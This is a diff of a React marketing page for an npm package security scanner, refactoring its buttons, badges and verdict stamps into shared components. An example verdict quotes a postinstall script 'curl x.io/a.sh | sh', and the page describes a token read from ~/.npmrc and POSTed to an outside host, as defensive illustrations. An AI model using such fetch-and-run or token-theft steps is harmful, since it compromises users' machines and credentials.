@@ -30,6 +30,10 @@
 
 import { useEffect, useRef } from "react";
 import { Link } from "react-router";
+import type { Outcome } from "@npmguard/shared";
+import { Badge } from "../components/ui/badge.tsx";
+import { Button } from "../components/ui/button.tsx";
+import { VerdictStamp } from "../components/ui/verdict-stamp.tsx";
 import gsap from "gsap";
 import { ScrollTrigger } from "gsap/ScrollTrigger";
 import { DrawSVGPlugin } from "gsap/DrawSVGPlugin";
@@ -404,12 +408,12 @@ export function HowItWorks() {
               recording that has to back it up.
             </p>
             <div className="hiw-hero__cta" data-fade>
-              <a className="hiw-btn hiw-btn--primary" href="#hiw-line">
-                Watch one get caught
-              </a>
-              <a className="hiw-btn" href="#hiw-verdict">
-                What the verdicts mean
-              </a>
+              <Button asChild size="lg">
+                <a href="#hiw-line">Watch one get caught</a>
+              </Button>
+              <Button asChild variant="outline" size="lg">
+                <a href="#hiw-verdict">What the verdicts mean</a>
+              </Button>
             </div>
           </div>
 
@@ -458,9 +462,7 @@ export function HowItWorks() {
                 <div>
                   <div className="hiw-step__label">Verdict</div>
                   <div className="hiw-step__val hiw-step__val--verdict">
-                    <span className="hiw-stamp hiw-stamp--danger" data-stamp data-hero-stamp>
-                      Dangerous
-                    </span>
+                    <VerdictStamp outcome="DANGEROUS" data-stamp data-hero-stamp />
                     <span className="hiw-step__cited">
                       cited <span className="hiw-cite">e2 e5 e6</span>
                     </span>
@@ -575,17 +577,17 @@ export function HowItWorks() {
                 <div className="hiw-filelist">
                   <div className="hiw-filerow" data-u-file>
                     <span className="hiw-filerow__name">index.js</span>
-                    <span className="hiw-chip">runtime</span>
+                    <Badge>runtime</Badge>
                   </div>
                   <div className="hiw-filerow" data-u-file>
                     <span className="hiw-filerow__name">scripts/setup.js</span>
-                    <span className="hiw-chip hiw-chip--warn" data-u-hot>
+                    <Badge tone="danger" data-u-hot>
                       runs on install
-                    </span>
+                    </Badge>
                   </div>
                   <div className="hiw-filerow" data-u-file>
                     <span className="hiw-filerow__name">README.md</span>
-                    <span className="hiw-chip">doc</span>
+                    <Badge>doc</Badge>
                   </div>
                 </div>
               </div>
@@ -605,7 +607,7 @@ export function HowItWorks() {
                     <span className="hiw-caret" aria-hidden="true" />
                   </p>
                   <div className="hiw-chiprow" data-p-chip>
-                    <span className="hiw-chip hiw-chip--ok">powers this justifies: none</span>
+                    <Badge tone="safe">powers this justifies: none</Badge>
                   </div>
                 </div>
               </div>
@@ -699,14 +701,12 @@ export function HowItWorks() {
                   “The planted token was read from <span className="hiw-mono">~/.npmrc</span> and
                   POSTed to a host unrelated to terminal styling.”
                   <div className="hiw-jcard__foot">
-                    <span className="hiw-stamp hiw-stamp--danger" data-stamp data-j-stamp>
-                      Dangerous
-                    </span>
+                    <VerdictStamp outcome="DANGEROUS" data-stamp data-j-stamp />
                     <span className="hiw-cites">
                       {["e2", "e5", "e6"].map((id) => (
-                        <span className="hiw-chip hiw-chip--info" data-j-cite key={id}>
+                        <Badge tone="accent" mono data-j-cite key={id}>
                           {id}
-                        </span>
+                        </Badge>
                       ))}
                     </span>
                   </div>
@@ -726,10 +726,9 @@ export function HowItWorks() {
 
           <div className="hiw-offramps">
             <Exit
-              tone="danger"
+              outcome="DANGEROUS"
               pkg="sketchy-installer@0.3.1"
               ran={1}
-              stamp="Dangerous"
               rationale="Dealbreaker: shell-pipe — Script 'postinstall' contains shell pipe: curl x.io/a.sh | sh"
               foot="no model was asked, no sandbox was started"
               rows={[
@@ -744,10 +743,9 @@ export function HowItWorks() {
               ]}
             />
             <Exit
-              tone="safe"
+              outcome="SAFE"
               pkg="chalk@5.6.2"
               ran={3}
-              stamp="Safe"
               rationale="No suspicions were raised."
               foot="every file was read against the pitch; none of them accused it"
               rows={[
@@ -804,9 +802,7 @@ export function HowItWorks() {
 
           <div className="hiw-vgrid">
             <article className="hiw-vcard hiw-vcard--danger" data-vcard>
-              <span className="hiw-stamp hiw-stamp--danger" data-stamp>
-                Dangerous
-              </span>
+              <VerdictStamp outcome="DANGEROUS" data-stamp />
               <h3>We saw it happen.</h3>
               <p>
                 Accused in advance, provoked on purpose, confirmed against numbered lines of the
@@ -817,9 +813,7 @@ export function HowItWorks() {
               </span>
             </article>
             <article className="hiw-vcard hiw-vcard--safe" data-vcard>
-              <span className="hiw-stamp hiw-stamp--safe" data-stamp>
-                Safe
-              </span>
+              <VerdictStamp outcome="SAFE" data-stamp />
               <h3>Nothing we could confirm.</h3>
               <p>
                 Either nothing was accused, or everything accused ran to completion with all four
@@ -828,9 +822,7 @@ export function HowItWorks() {
               <span className="hiw-vcard__k">always shipped beside its coverage counts</span>
             </article>
             <article className="hiw-vcard hiw-vcard--error" data-vcard>
-              <span className="hiw-stamp hiw-stamp--error" data-stamp>
-                Could not conclude
-              </span>
+              <VerdictStamp outcome="ERROR" data-stamp />
               <h3>We tried, and failed.</h3>
               <p>
                 A recorder failed, or the run was cut short. There is no report, and you are invited
@@ -882,9 +874,7 @@ export function HowItWorks() {
                   arriving where it actually matters. */}
               <div className="hiw-verdictblock" data-term-out>
                 <div className="hiw-verdictblock__head">
-                  <span className="hiw-stamp hiw-stamp--danger" data-stamp>
-                    Dangerous
-                  </span>
+                  <VerdictStamp outcome="DANGEROUS" data-stamp />
                   <span>credential theft, confirmed in a sandbox run</span>
                 </div>
                 <p className="hiw-verdictblock__where">
@@ -919,9 +909,9 @@ export function HowItWorks() {
             <code className="hiw-cta__cmd">
               <span className="hiw-prompt">$</span> npx npmguard-cli install express
             </code>
-            <Link className="hiw-btn" to="/cli">
-              Get the CLI
-            </Link>
+            <Button asChild variant="outline">
+              <Link to="/cli">Get the CLI</Link>
+            </Button>
           </div>
         </div>
       </section>
@@ -962,22 +952,23 @@ function Station({
  *  same "no signal here" texture the app uses for an unevaluated state. Prose
  *  can say "it stops at step one"; this shows the five steps that never ran. */
 function Exit({
-  tone,
+  outcome,
   pkg,
   ran,
   rows,
-  stamp,
   rationale,
   foot,
 }: {
-  tone: "danger" | "safe";
+  /** The contract's own type, not a local tone + a prose label. Those were two
+   * props encoding one fact, and nothing stopped them disagreeing. */
+  outcome: Outcome;
   pkg: string;
   ran: number;
   rows: [string, string, React.ReactNode][];
-  stamp: string;
   rationale: string;
   foot: string;
 }) {
+  const tone = outcome === "DANGEROUS" ? "danger" : "safe";
   return (
     <article className={`hiw-exit hiw-exit--${tone}`} data-exit>
       <header className="hiw-exit__bar">
@@ -1007,9 +998,7 @@ function Exit({
       </div>
 
       <div className="hiw-exit__verdict">
-        <span className={`hiw-stamp hiw-stamp--${tone}`} data-stamp>
-          {stamp}
-        </span>
+        <VerdictStamp outcome={outcome} data-stamp />
         <p className="hiw-exit__rationale">{rationale}</p>
       </div>
       <p className="hiw-exit__foot">{foot}</p>
